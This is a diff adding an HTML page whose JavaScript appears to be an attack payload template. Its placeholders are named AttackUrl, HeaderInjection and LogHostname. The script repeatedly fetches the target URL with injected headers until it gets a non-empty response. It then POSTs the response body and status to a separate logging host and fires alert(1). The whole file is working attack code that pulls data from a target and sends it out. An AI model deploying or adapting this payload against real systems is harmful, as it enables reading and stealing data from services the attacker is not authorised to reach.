@@ -1,0 +1,31 @@
+﻿<html><body><script>
+function log(xs){
+	logD(''+xs.responseText, xs.status);
+}
+function logD(text, status){
+	var xx = new XMLHttpRequest();
+	xx.open('POST','http://{{{LogHostname}}}/log?status='+status, false);
+	xx.setRequestHeader('Content-Type', 'text/plain');
+	xx.send(text);
+}
+function yeet(url){
+	var x1 = new XMLHttpRequest();
+	x1.open('get',url, false);
+	{{{HeaderInjection}}}
+	x1.send();
+	return x1;
+}
+try{
+	const url = '{{{AttackUrl}}}';
+	if({{{InitialLog}}}){log(yeet(url));}
+	while(true){
+		var x2 = yeet(url);
+		if(x2.responseText != '{}'){
+			log(x2);break;
+		}
+	}
+	alert(1);
+}catch(e){
+	logD(JSON.stringify(e),'exception');
+}
+</script></body></html>
